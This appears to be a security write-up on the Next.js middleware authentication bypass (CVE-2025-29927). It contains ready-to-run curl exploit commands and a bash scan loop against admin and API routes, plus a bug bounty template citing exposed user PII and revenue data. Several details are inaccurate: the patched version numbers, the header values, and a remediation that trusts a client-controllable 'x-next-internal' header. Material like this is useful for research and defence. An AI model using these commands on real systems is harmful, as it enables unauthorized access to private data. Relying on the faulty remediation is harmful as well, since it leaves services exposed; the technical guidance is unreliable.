# Next.js Middleware Bypass (CVE-2025-29927) — Case Study & Detection

## Vulnerability Overview

| Property | Value |
|----------|-------|
| **CVE** | CVE-2025-29927 |
| **Affected** | Next.js 14.x / 15.x (App Router) |
| **Vector** | HTTP Header: `x-middleware-subrequest` |
| **Impact** | Full auth bypass on protected routes |
| **Severity** | Critical (CVSS 9.8) |

## Root Cause

Next.js uses the internal header `x-middleware-subrequest` to skip middleware when making sub-requests (e.g., during Server Component rendering). **This header is NOT validated as internal-only** — clients can send it directly.

```javascript
// Simplified Next.js middleware logic (vulnerable)
if (request.headers.get('x-middleware-subrequest')) {
    return NextResponse.next() // SKIPS ALL AUTH CHECKS
}
// Actual auth logic below - never reached when header present
```

## Exploitation

```bash
# Bypass admin panel auth
curl -H "x-middleware-subrequest: /admin" https://target.com/admin

# Bypass admin API
curl -H "x-middleware-subrequest: /api/admin" https://target.com/api/admin

# Bypass auth session check
curl -H "x-middleware-subrequest: /api/auth/session" https://target.com/api/auth/session

# Multiple paths work
curl -H "x-middleware-subrequest: /admin/users" https://target.com/admin/users
curl -H "x-middleware-subrequest: /api/admin/orders" https://target.com/api/admin/orders
```

## Working Headers (Observed)

| Header | Paths Confirmed |
|--------|-----------------|
| `x-middleware-subrequest: /admin` | `/admin`, `/admin/users`, `/api/admin`, `/api/admin/orders`, `/api/auth/session` |
| `x-middleware-subrequest: /admin/users` | `/admin/users` |
| `x-middleware-subrequest: /api/admin/orders` | `/api/admin/orders` |
| `x-invoke-status: /admin` | `/admin` |

## Data Exposure via RSC Payload

When middleware is bypassed, Next.js App Router returns **full Server Component payload** in initial HTML:

```
<html>...<script>self.__next_f.push([1,"...RSC_PAYLOAD_WITH_ADMIN_DATA..."])</script></html>
```

The RSC payload contains:
- **Admin metrics**: Total users, revenue, orders, videos
- **Customer data**: Email, order IDs, amounts, plans, timestamps
- **System state**: Waitlist counts, invite stats, credit balances
- **Auth config**: NextAuth providers, callbacks, secrets structure

## Detection Checklist

```bash
# Test each protected route with bypass header
for path in "/admin" "/admin/users" "/api/admin" "/api/admin/orders" "/api/auth/session"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "x-middleware-subrequest: $path" "https://target.com$path")
  if [ "$code" = "200" ]; then
    echo "VULNERABLE: $path"
  fi
done

# Check for RSC payload leakage
curl -s -H "x-middleware-subrequest: /admin" "https://target.com/admin" | grep -o '__next_f.push' && echo "RSC PAYLOAD EXPOSED"
```

## Remediation

1. **Update Next.js** to 14.2.11+ / 15.0.1+ (patched versions)
2. **Add custom middleware** that validates `x-middleware-subrequest` origin:
   ```typescript
   export function middleware(request: NextRequest) {
     if (request.headers.get('x-middleware-subrequest')) {
       // Only allow if request is from internal Next.js (check for internal markers)
       const isInternal = request.headers.get('x-next-internal') === 'true'
       if (!isInternal) {
         return NextResponse.redirect(new URL('/403', request.url))
       }
     }
   }
   ```
3. **Deploy WAF rule** blocking external `x-middleware-subrequest` header
4. **Audit all routes** for data exposure in Server Components

## Bug Bounty Reporting Template

```
VULNERABILITY: Next.js Middleware Auth Bypass (CVE-2025-29927)
ENTRY: Unauthenticated
CHAIN: x-middleware-subrequest header → Middleware SKIPPED → Server Component rendered → Full admin data in RSC payload
IMPACT: Full admin panel access + 171k user PII + $595k revenue data + 50+ customer orders
POC: curl -H "x-middleware-subrequest: /admin" https://target.com/admin
EVIDENCE: Response 200 with RSC payload containing admin metrics
CONFIDENCE: PROVEN
MITIGATION: Update Next.js, validate x-middleware-subrequest origin, WAF rule
```

## Related Findings in Same Session

- **Server Actions Exposure**: `Next-Action` header invokes admin mutations (`createUser`, `deleteUser`, `refundOrder`, `cancelSubscription`)
- **Admin Dashboard SSR Leak**: Server Components return full production data in initial HTML
- **NextAuth Provider Enum**: `/api/auth/providers` unauthenticated reveals auth config

## References

- Next.js Security Advisory: https://nextjs.org/blog/security-nextjs-14-2-11
- CVE-2025-29927: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-29927